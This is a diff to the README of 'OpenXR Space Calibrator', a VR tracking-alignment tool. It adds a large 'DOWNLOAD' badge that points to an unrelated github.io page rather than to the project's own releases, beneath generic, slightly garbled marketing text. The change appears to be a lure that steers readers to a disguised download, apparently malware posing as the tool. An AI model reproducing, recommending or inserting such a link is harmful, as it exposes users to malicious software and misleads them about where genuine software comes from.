@@ -30,6 +30,12 @@ OpenXR Space Calibrator aligns the tracking coordinate systems of mixed-vendor V
 
 Whether you're a newcomer or a veteran, OpenXR Space Calibrator provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download OpenXR Space Calibrator](https://img.shields.io/badge/⬇_DOWNLOAD_OpenXR+Space+Calibrator-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
